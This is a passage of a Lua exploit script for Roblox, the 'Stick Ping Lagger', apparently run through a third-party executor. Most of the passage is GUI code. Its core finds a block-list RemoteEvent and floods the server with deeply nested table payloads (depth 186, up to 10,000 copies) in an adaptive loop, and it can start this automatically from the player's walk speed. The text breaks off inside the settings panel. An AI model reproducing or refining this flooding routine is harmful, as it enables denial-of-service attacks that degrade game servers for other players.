--[[
    STICK PING LAGGER
    GUI estilo StickSemiTP (panel transparente + bordes rojos)
    Toggle estilo Helper V2 · Settings en panel aparte
]]

local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")

if not game:IsLoaded() then game.Loaded:Wait() end

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")

----------------------------------------------------------------
-- Safe GUI parent
----------------------------------------------------------------
local function getGuiParent()
    if gethui then return gethui() end
    local ok = pcall(function()
        local t = Instance.new("Folder")
        t.Parent = game:GetService("CoreGui")
        t:Destroy()
    end)
    if ok then return game:GetService("CoreGui") end
    return PlayerGui
end

----------------------------------------------------------------
-- Colors (Stick)
----------------------------------------------------------------
local MAIN_FONT       = Enum.Font.FredokaOne
local COLOR_ACCENT    = Color3.fromRGB(255, 25, 45)
local COLOR_TEXT      = Color3.fromRGB(255, 255, 255)
local COLOR_TEXT_DIM  = Color3.fromRGB(180, 120, 130)
local COLOR_OFF       = Color3.fromRGB(70, 70, 75)

----------------------------------------------------------------
-- Config
----------------------------------------------------------------
local Config = {
    keybind   = Enum.KeyCode.V,
    power     = 50000,
    delay     = 0.125,
    minDelay  = 0.05,
    maxDelay  = 0.5,
    preset    = "MID",
    active    = false,
    autoBrain = true,
    locked    = false,
    posSX     = 0.18,
    posOX     = 0,
    posSY     = 0.15,
    posOY     = 0,
    setSX     = 0.18,
    setOX     = 220,
    setSY     = 0.15,
    setOY     = 0,
}

local PRESETS = {
    LOW  = 10000,
    MID  = 50000,
    HIGH = 100000,
}

local CONFIG_FILE = "StickPingLagger_Config.json"

local function loadConfig()
    pcall(function()
        if type(isfile) ~= "function" or not isfile(CONFIG_FILE) then return end
        local data = HttpService:JSONDecode(readfile(CONFIG_FILE))
        if type(data) ~= "table" then return end
        if type(data.Keybind) == "string" and Enum.KeyCode[data.Keybind] then
            Config.keybind = Enum.KeyCode[data.Keybind]
        end
        if type(data.power) == "number" then
            Config.power = math.clamp(math.floor(data.power), 1, 999999)
        end
        if type(data.delay) == "number" then Config.delay = math.clamp(data.delay, 0.03, 1) end
        if type(data.minDelay) == "number" then Config.minDelay = math.clamp(data.minDelay, 0.02, 0.5) end
        if type(data.maxDelay) == "number" then Config.maxDelay = math.clamp(data.maxDelay, 0.1, 1.5) end
        if type(data.preset) == "string" and PRESETS[data.preset] then Config.preset = data.preset end
        for _, k in ipairs({"posSX","posOX","posSY","posOY","setSX","setOX","setSY","setOY"}) do
            if type(data[k]) == "number" then Config[k] = data[k] end
        end
        if type(data.autoBrain) == "boolean" then Config.autoBrain = data.autoBrain end
        if type(data.locked) == "boolean" then Config.locked = data.locked end
    end)
end

local function saveConfig()
    pcall(function()
        if type(writefile) ~= "function" then return end
        writefile(CONFIG_FILE, HttpService:JSONEncode({
            Keybind  = Config.keybind.Name,
            power    = Config.power,
            delay    = Config.delay,
            minDelay = Config.minDelay,
            maxDelay = Config.maxDelay,
            preset   = Config.preset,
            posSX    = Config.posSX,
            posOX    = Config.posOX,
            posSY    = Config.posSY,
            posOY    = Config.posOY,
            setSX    = Config.setSX,
            setOX    = Config.setOX,
            setSY    = Config.setSY,
            setOY    = Config.setOY,
            autoBrain= Config.autoBrain,
            locked   = Config.locked,
        }))
    end)
end

loadConfig()

-- forward UI refresh (assigned later)
local uiRefresh = function() end

----------------------------------------------------------------
-- Remote + Bomb
----------------------------------------------------------------
local function findBlockRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then pcall(function() rrs = game:GetService("RobloxReplicatedStorage") end) end
    if not rrs then return nil end
    for _, name in ipairs({
        "SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList",
        "UpdateBlockList", "BlockList", "PlayerBlockList",
    }) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then return r end
    end
    for _, child in ipairs(rrs:GetChildren()) do
        if child:IsA("RemoteEvent") and tostring(child.Name):find("Block") then return child end
    end
    return nil
end

-- Flux-style payload (depth 186, copies = power/188 up to 10000)
local function buildBomb(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.max(1, math.min(math.floor((tonumber(power) or 50000) / 188), 10000))
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local function formatPower(n)
    n = tonumber(n) or 0
    if n >= 1000000 then return string.format("%.1fM", n / 1000000) end
    if n >= 1000 then return string.format("%.0fK", n / 1000) end
    return tostring(n)
end

----------------------------------------------------------------
-- Lag engine (Flux-style adaptive loop)
----------------------------------------------------------------
local lagThread = nil
local cachedRemote = nil
local currentWait = Config.delay
local brainrotMode = false
local lastBrainrotState = false
local manualOverride = false

local function stopLag()
    Config.active = false
    if lagThread then pcall(task.cancel, lagThread) lagThread = nil end
end

local function startLag()
    if Config.active and lagThread then return true end
    stopLag()
    cachedRemote = findBlockRemote()
    if not cachedRemote then
        task.wait(0.15)
        cachedRemote = findBlockRemote()
    end
    if not cachedRemote then
        warn("[STICK Ping Lagger] BlockList remote not found")
        return false
    end
    Config.active = true
    currentWait = Config.delay
    lagThread = task.spawn(function()
        local delay = Config.delay
        while Config.active do
            local r = cachedRemote or findBlockRemote()
            if not r then
                task.wait(0.3)
                r = findBlockRemote()
                cachedRemote = r
                if not r then
                    Config.active = false
                    break
                end
            end
            local payload = buildBomb(Config.power)
            local ok = pcall(function() r:FireServer(payload) end)
            if not ok then
                delay = math.min(delay * 1.5, Config.maxDelay)
            else
                delay = math.max(delay * 0.995, Config.minDelay)
            end
            currentWait = delay
            task.wait(delay)
        end
    end)
    return true
end

local function toggleLag()
    if Config.active then
        stopLag()
        if brainrotMode then manualOverride = true end
    else
        if brainrotMode then manualOverride = false end
        startLag()
    end
    return Config.active
end

-- Auto Activate when holding brainrot (WalkSpeed < 25), like Flux
RunService.Heartbeat:Connect(function()
    if not Config.autoBrain then
        if brainrotMode then
            brainrotMode = false
            lastBrainrotState = false
        end
        return
    end
    if manualOverride then return end
    local char = LocalPlayer.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local hasBrainrot = hum.WalkSpeed < 25
    if hasBrainrot and not lastBrainrotState then
        brainrotMode = true
        lastBrainrotState = true
        startLag()
        pcall(uiRefresh)
    elseif not hasBrainrot and lastBrainrotState then
        brainrotMode = false
        lastBrainrotState = false
        stopLag()
        pcall(uiRefresh)
    end
end)

----------------------------------------------------------------
-- Destroy old
----------------------------------------------------------------
pcall(function()
    local parent = getGuiParent()
    for _, name in ipairs({"StickPingLagger", "noxaPingLagger"}) do
        local old = parent:FindFirstChild(name)
        if old then old:Destroy() end
    end
end)

----------------------------------------------------------------
-- Helpers
----------------------------------------------------------------
local function corner(obj, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, r or 10)
    c.Parent = obj
    return c
end

local function stroke(obj, color, thick, transp)
    local s = Instance.new("UIStroke")
    s.Color = color or COLOR_ACCENT
    s.Thickness = thick or 1.6
    s.Transparency = transp or 0.05
    s.Parent = obj
    return s
end

local function tween(obj, info, props)
    local t = TweenService:Create(obj, info, props)
    t:Play()
    return t
end

local function makeDraggable(handle, target, saveKey)
    local dragging, origin, startPos
    handle.InputBegan:Connect(function(input)
        if Config.locked then return end
        if input.UserInputType ~= Enum.UserInputType.MouseButton1
            and input.UserInputType ~= Enum.UserInputType.Touch then return end
        dragging = true
        origin = input.Position
        startPos = target.Position
    end)
    UserInputService.InputChanged:Connect(function(input)
        if not dragging then return end
        if input.UserInputType ~= Enum.UserInputType.MouseMovement
            and input.UserInputType ~= Enum.UserInputType.Touch then return end
        local d = input.Position - origin
        target.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + d.X,
            startPos.Y.Scale, startPos.Y.Offset + d.Y
        )
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            if dragging then
                dragging = false
                if saveKey == "main" then
                    Config.posSX = target.Position.X.Scale
                    Config.posOX = target.Position.X.Offset
                    Config.posSY = target.Position.Y.Scale
                    Config.posOY = target.Position.Y.Offset
                elseif saveKey == "settings" then
                    Config.setSX = target.Position.X.Scale
                    Config.setOX = target.Position.X.Offset
                    Config.setSY = target.Position.Y.Scale
                    Config.setOY = target.Position.Y.Offset
                end
                saveConfig()
            end
        end
    end)
end

----------------------------------------------------------------
-- ScreenGui
----------------------------------------------------------------
local gui = Instance.new("ScreenGui")
gui.Name = "StickPingLagger"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 130
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = getGuiParent()

----------------------------------------------------------------
-- ========== MAIN PANEL ==========
----------------------------------------------------------------
local BG_IMAGE = "rbxassetid://120361169727304"

local panel = Instance.new("Frame")
panel.Name = "MainPanel"
panel.Size = UDim2.fromOffset(200, 132)
panel.Position = UDim2.new(Config.posSX, Config.posOX, Config.posSY, Config.posOY)
panel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
panel.BackgroundTransparency = 0.2
panel.BorderSizePixel = 0
panel.Active = true
panel.ClipsDescendants = true
panel.ZIndex = 10
panel.Parent = gui
corner(panel, 16)
stroke(panel, COLOR_ACCENT, 2, 0.05)

local panelBg = Instance.new("ImageLabel")
panelBg.Name = "BgImage"
panelBg.Size = UDim2.fromScale(1, 1)
panelBg.BackgroundTransparency = 1
panelBg.Image = BG_IMAGE
panelBg.ImageTransparency = 0.12
panelBg.ScaleType = Enum.ScaleType.Crop
panelBg.ZIndex = 10
panelBg.Parent = panel
corner(panelBg, 16)

local panelShade = Instance.new("Frame")
panelShade.Name = "Shade"
panelShade.Size = UDim2.fromScale(1, 1)
panelShade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
panelShade.BackgroundTransparency = 0.42
panelShade.BorderSizePixel = 0
panelShade.ZIndex = 10
panelShade.Parent = panel
corner(panelShade, 16)

-- Header
local header = Instance.new("Frame")
header.Name = "Header"
header.Size = UDim2.new(1, 0, 0, 42)
header.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
header.BackgroundTransparency = 0.55
header.BorderSizePixel = 0
header.ZIndex = 11
header.Parent = panel
corner(header, 16)

local headerFix = Instance.new("Frame")
headerFix.Size = UDim2.new(1, 0, 0, 14)
headerFix.Position = UDim2.new(0, 0, 1, -14)
headerFix.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
headerFix.BackgroundTransparency = 0.5
headerFix.BorderSizePixel = 0
headerFix.ZIndex = 11
headerFix.Parent = header

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -50, 0, 17)
title.Position = UDim2.fromOffset(12, 4)
title.BackgroundTransparency = 1
title.Font = MAIN_FONT
title.TextSize = 13
title.TextColor3 = COLOR_TEXT
title.TextXAlignment = Enum.TextXAlignment.Left
title.TextStrokeTransparency = 0
title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "STICK PING LAGGER"
title.ZIndex = 12
title.Parent = header

local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1, -50, 0, 13)
sub.Position = UDim2.fromOffset(12, 22)
sub.BackgroundTransparency = 1
sub.Font = MAIN_FONT
sub.TextSize = 10
sub.TextColor3 = COLOR_ACCENT
sub.TextXAlignment = Enum.TextXAlignment.Left
sub.TextStrokeTransparency = 0
sub.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
sub.Text = "PING LAGGER"
sub.ZIndex = 12
sub.Parent = header

-- Settings gear
local settingsBtn = Instance.new("TextButton")
settingsBtn.Name = "SettingsBtn"
settingsBtn.Size = UDim2.fromOffset(28, 26)
settingsBtn.Position = UDim2.new(1, -36, 0, 8)
settingsBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
settingsBtn.BackgroundTransparency = 0.35
settingsBtn.BorderSizePixel = 0
settingsBtn.Font = MAIN_FONT
settingsBtn.TextSize = 14
settingsBtn.TextColor3 = COLOR_TEXT
settingsBtn.Text = "⚙"
settingsBtn.AutoButtonColor = false
settingsBtn.ZIndex = 13
settingsBtn.Parent = header
corner(settingsBtn, 7)
stroke(settingsBtn, COLOR_ACCENT, 1.2, 0.25)

makeDraggable(header, panel, "main")

----------------------------------------------------------------
-- Content main
----------------------------------------------------------------
local content = Instance.new("Frame")
content.Name = "Content"
content.Size = UDim2.new(1, -16, 0, 80)
content.Position = UDim2.fromOffset(8, 48)
content.BackgroundTransparency = 1
content.ZIndex = 11
content.Parent = panel

-- Toggle PING LAGGER
local toggleRow = Instance.new("Frame")
toggleRow.Size = UDim2.new(1, 0, 0, 28)
toggleRow.BackgroundTransparency = 1
toggleRow.ZIndex = 12
toggleRow.Parent = content

local toggleLbl = Instance.new("TextLabel")
toggleLbl.Size = UDim2.new(0.55, 0, 1, 0)
toggleLbl.Position = UDim2.fromOffset(2, 0)
toggleLbl.BackgroundTransparency = 1
toggleLbl.Text = "PING LAGGER"
toggleLbl.TextColor3 = COLOR_TEXT
toggleLbl.Font = MAIN_FONT
toggleLbl.TextSize = 12
toggleLbl.TextXAlignment = Enum.TextXAlignment.Left
toggleLbl.TextStrokeTransparency = 0
toggleLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
toggleLbl.ZIndex = 13
toggleLbl.Parent = toggleRow

local track = Instance.new("TextButton")
track.Name = "ToggleTrack"
track.Size = UDim2.fromOffset(44, 24)
track.Position = UDim2.new(1, -46, 0.5, -12)
track.BackgroundColor3 = COLOR_OFF
track.BorderSizePixel = 0
track.Text = ""
track.AutoButtonColor = false
track.ZIndex = 14
track.Parent = toggleRow
corner(track, 12)
local trackStroke = stroke(track, Color3.fromRGB(100, 100, 105), 1.5, 0.15)

local pin = Instance.new("Frame")
pin.Name = "TogglePin"
pin.Size = UDim2.fromOffset(20, 20)
pin.Position = UDim2.fromOffset(2, 2)
pin.BackgroundColor3 = Color3.fromRGB(200, 200, 205)
pin.BorderSizePixel = 0
pin.ZIndex = 15
pin.Parent = track
corner(pin, 10)

local function applyToggleVisual(on)
    if on then
        track.BackgroundColor3 = COLOR_ACCENT
        trackStroke.Color = Color3.fromRGB(255, 100, 120)
        pin.Position = UDim2.new(1, -22, 0.5, -10)
        pin.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        toggleLbl.TextColor3 = Color3.fromRGB(90, 255, 150)
    else
        track.BackgroundColor3 = COLOR_OFF
        trackStroke.Color = Color3.fromRGB(100, 100, 105)
        pin.Position = UDim2.fromOffset(2, 2)
        pin.BackgroundColor3 = Color3.fromRGB(200, 200, 205)
        toggleLbl.TextColor3 = COLOR_TEXT
    end
end

uiRefresh = function()
    applyToggleVisual(Config.active)
end

track.MouseButton1Click:Connect(function()
    toggleLag()
    applyToggleVisual(Config.active)
end)

-- Keybind + Lock side by side
local bottomRow = Instance.new("Frame")
bottomRow.Size = UDim2.new(1, 0, 0, 30)
bottomRow.Position = UDim2.fromOffset(0, 36)
bottomRow.BackgroundTransparency = 1
bottomRow.ZIndex = 12
bottomRow.Parent = content

local keyBtn = Instance.new("TextButton")
keyBtn.Size = UDim2.fromOffset(88, 28)
keyBtn.Position = UDim2.fromOffset(0, 1)
keyBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
keyBtn.BackgroundTransparency = 0.35
keyBtn.BorderSizePixel = 0
keyBtn.Font = MAIN_FONT
keyBtn.TextSize = 11
keyBtn.TextColor3 = COLOR_TEXT
keyBtn.Text = "KEY [" .. Config.keybind.Name .. "]"
keyBtn.AutoButtonColor = false
keyBtn.ZIndex = 13
keyBtn.Parent = bottomRow
corner(keyBtn, 8)
stroke(keyBtn, COLOR_ACCENT, 1.3, 0.25)

local lockBtn = Instance.new("TextButton")
lockBtn.Size = UDim2.fromOffset(88, 28)
lockBtn.Position = UDim2.new(1, -88, 0, 1)
lockBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
lockBtn.BackgroundTransparency = 0.35
lockBtn.BorderSizePixel = 0
lockBtn.Font = MAIN_FONT
lockBtn.TextSize = 11
lockBtn.TextColor3 = COLOR_TEXT
lockBtn.Text = Config.locked and "🔒 LOCKED" or "🔓 UNLOCK"
lockBtn.AutoButtonColor = false
lockBtn.ZIndex = 13
lockBtn.Parent = bottomRow
corner(lockBtn, 8)
local lockStroke = stroke(lockBtn, COLOR_ACCENT, 1.3, 0.25)

local function refreshLock()
    if Config.locked then
        lockBtn.Text = "🔒 LOCKED"
        lockBtn.BackgroundColor3 = COLOR_ACCENT
        lockBtn.BackgroundTransparency = 0.15
        lockBtn.TextColor3 = COLOR_TEXT
        lockStroke.Transparency = 0
    else
        lockBtn.Text = "🔓 UNLOCK"
        lockBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        lockBtn.BackgroundTransparency = 0.35
        lockBtn.TextColor3 = COLOR_TEXT
        lockStroke.Transparency = 0.25
    end
end

lockBtn.MouseButton1Click:Connect(function()
    Config.locked = not Config.locked
    refreshLock()
    saveConfig()
end)

local capturing = false
keyBtn.MouseButton1Click:Connect(function()
    capturing = true
    keyBtn.Text = "KEY [...]"
    keyBtn.TextColor3 = COLOR_ACCENT
end)

----------------------------------------------------------------
-- ========== SETTINGS PANEL (aparte) ==========
----------------------------------------------------------------
local settingsPanel = Instance.new("Frame")
settingsPanel.Name = "SettingsPanel"
settingsPanel.Size = UDim2.fromOffset(210, 300)
settingsPanel.Position = UDim2.new(Config.setSX, Config.setOX, Config.setSY, Config.setOY)
settingsPanel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
settingsPanel.BackgroundTransparency = 0.2
settingsPanel.BorderSizePixel = 0
settingsPanel.Active = true
settingsPanel.ClipsDescendants = true
settingsPanel.Visible = false
settingsPanel.ZIndex = 20
settingsPanel.Parent = gui
corner(settingsPanel, 16)
stroke(settingsPanel, COLOR_ACCENT, 2, 0.05)

local settingsBg = Instance.new("ImageLabel")
settingsBg.Name = "BgImage"
settingsBg.Size = UDim2.fromScale(1, 1)
settingsBg.BackgroundTransparency = 1
settingsBg.Image = BG_IMAGE
settingsBg.ImageTransparency = 0.12
settingsBg.ScaleType = Enum.ScaleType.Crop
settingsBg.ZIndex = 20
settingsBg.Parent = settingsPanel
corner(settingsBg, 16)

local settingsShade = Instance.new("Frame")
settingsShade.Name = "Shade"
settingsShade.Size = UDim2.fromScale(1, 1)
settingsShade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
settingsShade.BackgroundTransparency = 0.42
settingsShade.BorderSizePixel = 0
settingsShade.ZIndex = 20
settingsShade.Parent = settingsPanel
corner(settingsShade, 16)

-- Settings header
local sHeader = Instance.new("Frame")
sHeader.Size = UDim2.new(1, 0, 0, 38)
sHeader.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sHeader.BackgroundTransparency = 0.5
sHeader.BorderSizePixel = 0
sHeader.ZIndex = 21
sHeader.Parent = settingsPanel
corner(sHeader, 16)

local sHeaderFix = Instance.new("Frame")
sHeaderFix.Size = UDim2.new(1, 0, 0, 12)
sHeaderFix.Position = UDim2.new(0, 0, 1, -12)
sHeaderFix.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sHeaderFix.BackgroundTransparency = 0.5
sHeaderFix.BorderSizePixel = 0
sHeaderFix.ZIndex = 21
sHeaderFix.Parent = sHeader

local sTitle = Instance.new("TextLabel")
sTitle.Size = UDim2.new(1, -40, 1, 0)
sTitle.Position = UDim2.fromOffset(12, 0)
sTitle.BackgroundTransparency = 1
sTitle.Font = MAIN_FONT
sTitle.TextSize = 13
sTitle.TextColor3 = COLOR_ACCENT
sTitle.TextXAlignment = Enum.TextXAlignment.Left
sTitle.TextYAlignment = Enum.TextYAlignment.Center
sTitle.TextStrokeTransparency = 0
sTitle.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
sTitle.Text = "SETTINGS"
sTitle.ZIndex = 22
sTitle.Parent = sHeader

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.fromOffset(26, 24)
closeBtn.Position = UDim2.new(1, -34, 0.5, -12)
closeBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
closeBtn.BackgroundTransparency = 0.35
closeBtn.BorderSizePixel = 0
closeBtn.Font = MAIN_FONT
closeBtn.TextSize = 14
closeBtn.TextColor3 = COLOR_TEXT
closeBtn.Text = "✕"
closeBtn.AutoButtonColor = false
closeBtn.ZIndex = 23
closeBtn.Parent = sHeader
corner(closeBtn, 7)
stroke(closeBtn, COLOR_ACCENT, 1.2, 0.3)

makeDraggable(sHeader, settingsPanel, "settings")

-- Settings body
local sBody = Instance.new("Frame")
sBody.Size = UDim2.new(1, -16, 1, -48)
sBody.Position = UDim2.fromOffset(8, 44)
sBody.BackgroundTransparency = 1
sBody.ZIndex = 21
sBody.Parent = settingsPanel

-- PRESETS
local presetLbl = Instance.new("TextLabel")
presetLbl.Size = UDim2.new(1, 0, 0, 14)
presetLbl.Position = UDim2.fromOffset(2, 0)
presetLbl.BackgroundTransparency = 1
presetLbl.Font = MAIN_FONT
presetLbl.TextSize = 10
presetLbl.TextColor3 = COLOR_TEXT_DIM
presetLbl.TextXAlignment = Enum.TextXAlignment.Left
presetLbl.TextStrokeTransparency = 0
presetLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
presetLbl.Text = "PRESETS"
presetLbl.ZIndex = 22
presetLbl.Parent = sBody

local presetBtns = {}
local presetOrder = {"LOW", "MID", "HIGH"}
for i, name in ipairs(presetOrder) do
    local b = Instance.new("TextButton")
    b.Size = UDim2.fromOffset(58, 26)
    b.Position = UDim2.fromOffset((i - 1) * 64, 18)
    b.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    b.BackgroundTransparency = 0.35
    b.BorderSizePixel = 0
    b.Font = MAIN_FONT
    b.TextSize = 11
    b.TextColor3 = COLOR_TEXT
    b.Text = name
    b.AutoButtonColor = false
    b.ZIndex = 22
    b.Parent = sBody
    corner(b, 7)
    local bs = stroke(b, COLOR_ACCENT, 1.2, 0.35)
    presetBtns[name] = {btn = b, stroke = bs}
end

local function refreshPresets()
    for name, data in pairs(presetBtns) do
        local sel = (Config.preset == name)
        data.btn.BackgroundColor3 = sel and COLOR_ACCENT or Color3.fromRGB(0, 0, 0)
        data.btn.BackgroundTransparency = sel and 0.1 or 0.35
        data.btn.TextColor3 = sel and Color3.fromRGB(12, 8, 10) or COLOR_TEXT
        data.stroke.Transparency = sel and 0 or 0.35
    end
end

-- BRAIN
local brainRow = Instance.new("Frame")
brainRow.Size = UDim2.new(1, 0, 0, 28)
brainRow.Position = UDim2.fromOffset(0, 52)
brainRow.BackgroundTransparency = 1
brainRow.ZIndex = 22
brainRow.Parent = sBody

local brainLbl = Instance.new("TextLabel")
brainLbl.Size = UDim2.new(0.5, 0, 1, 0)
brainLbl.Position = UDim2.fromOffset(2, 0)
brainLbl.BackgroundTransparency = 1
brainLbl.Font = MAIN_FONT
brainLbl.TextSize = 12
brainLbl.TextColor3 = COLOR_TEXT
brainLbl.TextXAlignment = Enum.TextXAlignment.Left
brainLbl.TextStrokeTransparency = 0
brainLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
brainLbl.Text = "BRAIN"
brainLbl.ZIndex = 23
brainLbl.Parent = brainRow

local brainTrack = Instance.new("TextButton")
brainTrack.Size = UDim2.fromOffset(44, 24)
brainTrack.Position = UDim2.new(1, -46, 0.5, -12)
brainTrack.BackgroundColor3 = Config.autoBrain and COLOR_ACCENT or COLOR_OFF
brainTrack.BorderSizePixel = 0
brainTrack.Text = ""
brainTrack.AutoButtonColor = false
brainTrack.ZIndex = 23
brainTrack.Parent = brainRow
corner(brainTrack, 12)
local brainStroke = stroke(brainTrack, Config.autoBrain and Color3.fromRGB(255, 100, 120) or Color3.fromRGB(100, 100, 105), 1.4, 0.15)

local brainPin = Instance.new("Frame")
brainPin.Size = UDim2.fromOffset(20, 20)
brainPin.Position = Config.autoBrain and UDim2.new(1, -22, 0.5, -10) or UDim2.fromOffset(2, 2)
brainPin.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
brainPin.BorderSizePixel = 0
brainPin.ZIndex = 24
brainPin.Parent = brainTrack
corner(brainPin, 10)

local function applyBrainVisual(on)
    if on then
        brainTrack.BackgroundColor3 = COLOR_ACCENT
        brainStroke.Color = Color3.fromRGB(255, 100, 120)
        brainPin.Position = UDim2.new(1, -22, 0.5, -10)
    else
        brainTrack.BackgroundColor3 = COLOR_OFF
        brainStroke.Color = Color3.fromRGB(100, 100, 105)
        brainPin.Position = UDim2.fromOffset(2, 2)
    end
end

brainTrack.MouseButton1Click:Connect(function()
    Config.autoBrain = not Config.autoBrain
    if not Config.autoBrain then
        brainrotMode = false
        lastBrainrotState = false
        manualOverride = false
    end
    applyBrainVisual(Config.autoBrain)
    saveConfig()
end)

-- POWER
local powerLbl = Instance.new("TextLabel")
powerLbl.Size = UDim2.new(1, 0, 0, 13)
powerLbl.Position = UDim2.fromOffset(2, 88)
powerLbl.BackgroundTransparency = 1
powerLbl.Font = MAIN_FONT
powerLbl.TextSize = 10
powerLbl.TextColor3 = COLOR_TEXT_DIM
powerLbl.TextXAlignment = Enum.TextXAlignment.Left
powerLbl.TextStrokeTransparency = 0
powerLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
powerLbl.Text = "POWER"
powerLbl.ZIndex = 22
powerLbl.Parent = sBody

local powerBox = Instance.new("TextBox")
powerBox.Size = UDim2.new(1, 0, 0, 28)
powerBox.Position = UDim2.fromOffset(0, 102)
powerBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
powerBox.BackgroundTransparency = 0.3
powerBox.BorderSizePixel = 0
powerBox.Font = MAIN_FONT
powerBox.TextSize = 13
powerBox.TextColor3 = COLOR_TEXT
powerBox.Text = tostring(Config.power)
powerBox.ClearTextOnFocus = false
powerBox.ZIndex = 22
powerBox.Parent = sBody
corner(powerBox, 8)
stroke(powerBox, COLOR_ACCENT, 1.2, 0.3)

local powerInfo = Instance.new("TextLabel")
powerInfo.Size = UDim2.new(1, 0, 0, 14)
powerInfo.Position = UDim2.fromOffset(2, 132)
powerInfo.BackgroundTransparency = 1
powerInfo.Font = MAIN_FONT
powerInfo.TextSize = 11
powerInfo.TextColor3 = COLOR_ACCENT
powerInfo.TextXAlignment = Enum.TextXAlignment.Left
powerInfo.TextStrokeTransparency = 0
powerInfo.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
powerInfo.Text = "→ " .. formatPower(Config.power)
powerInfo.ZIndex = 22
powerInfo.Parent = sBody

-- DELAY
local delayLbl = Instance.new("TextLabel")
delayLbl.Size = UDim2.new(1, 0, 0, 13)
delayLbl.Position = UDim2.fromOffset(2, 152)
delayLbl.BackgroundTransparency = 1
delayLbl.Font = MAIN_FONT
delayLbl.TextSize = 10
delayLbl.TextColor3 = COLOR_TEXT_DIM
delayLbl.TextXAlignment = Enum.TextXAlignment.Left
delayLbl.TextStrokeTransparency = 0
delayLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
delayLbl.Text = "BASE DELAY"
delayLbl.ZIndex = 22
delayLbl.Parent = sBody

local delayBox = Instance.new("TextBox")
delayBox.Size = UDim2.new(1, 0, 0, 28)
delayBox.Position = UDim2.fromOffset(0, 166)
delayBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
delayBox.BackgroundTransparency = 0.3
delayBox.BorderSizePixel = 0
delayBox.Font = MAIN_FONT
delayBox.TextSize = 13
delayBox.TextColor3 = COLOR_TEXT
delayBox.Text = tostring(Config.delay)
delayBox.ClearTextOnFocus = false
delayBox.ZIndex = 22
delayBox.Parent = sBody
corner(delayBox, 8)
stroke(delayBox, COLOR_ACCENT, 1.2, 0.3)

-- MIN / MAX
local minMaxLbl = Instance.new("TextLabel")
minMaxLbl.Size = UDim2.new(1, 0, 0, 13)
minMaxLbl.Position = UDim2.fromOffset(2, 202)
minMaxLbl.BackgroundTransparency = 1
minMaxLbl.Font = MAIN_FONT
minMaxLbl.TextSize = 10
minMaxLbl.TextColor3 = COLOR_TEXT_DIM
minMaxLbl.TextXAlignment = Enum.TextXAlignment.Left
minMaxLbl.TextStrokeTransparency = 0
minMaxLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
minMaxLbl.Text = "MIN / MAX DELAY"
minMaxLbl.ZIndex = 22
minMaxLbl.Parent = sBody

local minDelayBox = Instance.new("TextBox")
minDelayBox.Size = UDim2.new(0.48, -4, 0, 28)
minDelayBox.Position = UDim2.fromOffset(0, 216)
minDelayBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
minDelayBox.BackgroundTransparency = 0.3
minDelayBox.BorderSizePixel = 0
minDelayBox.Font = MAIN_FONT
minDelayBox.TextSize = 12
minDelayBox.TextColor3 = COLOR_TEXT
minDelayBox.Text = tostring(Config.minDelay)
minDelayBox.ClearTextOnFocus = false
minDelayBox.ZIndex = 22
minDelayBox.Parent = sBody
corner(minDelayBox, 8)
stroke(minDelayBox, COLOR_ACCENT, 1.2, 0.3)

local maxDelayBox = Instance.new("TextBox")
maxDelayBox.Size = UDim2.new(0.48, -4, 0, 28)
maxDelayBox.Position = UDim2.new(0.52, 0, 0, 216)
maxDelayBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
maxDelayBox.BackgroundTransparency = 0.3
maxDelayBox.BorderSizePixel = 0
maxDelayBox.Font = MAIN_FONT
maxDelayBox.TextSize = 12
maxDelayBox.TextColor3 = COLOR_TEXT
maxDelayBox.Text = tostring(Config.maxDelay)
maxDelayBox.ClearTextOnFocus = false
